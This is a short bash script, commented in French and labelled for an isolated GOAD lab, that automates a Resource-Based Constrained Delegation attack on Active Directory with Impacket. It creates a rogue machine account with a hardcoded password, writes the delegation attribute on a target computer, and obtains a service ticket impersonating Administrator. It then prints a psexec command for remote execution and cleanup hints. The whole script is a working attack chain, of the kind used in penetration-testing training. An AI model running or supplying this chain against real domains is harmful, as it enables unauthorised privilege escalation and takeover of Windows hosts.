#!/usr/bin/env bash
# Chaîne RBCD (lab isolé GOAD-X). NE PAS utiliser hors autorisation. Nettoyer après usage.
set -euo pipefail
DOMAIN="${1:?}"; DC="${2:?}"; USER="${3:?}"; PASS="${4:?}"; TARGET="${5:?TARGET\$}"; IMP="${6:-Administrator}"
EVIL="EVIL\$"; EVILPASS="Evil123!"
echo "[*] Création d'un compte machine contrôlé..."
impacket-addcomputer "$DOMAIN/$USER:$PASS" -computer-name "$EVIL" -computer-pass "$EVILPASS" -dc-ip "$DC"
echo "[*] Écriture de l'attribut RBCD sur $TARGET..."
impacket-rbcd -delegate-from "$EVIL" -delegate-to "$TARGET" -action write "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
echo "[*] S4U : ticket $IMP vers la cible..."
SPN="cifs/${TARGET%$}.$DOMAIN"
impacket-getST -spn "$SPN" -impersonate "$IMP" -dc-ip "$DC" "$DOMAIN/$EVIL:$EVILPASS"
echo "[*] Utilise : export KRB5CCNAME=${IMP}.ccache ; impacket-psexec -k -no-pass ${TARGET%$}.$DOMAIN"
echo "[!] Nettoyage : impacket-rbcd -action remove ... ; supprimer le compte $EVIL"
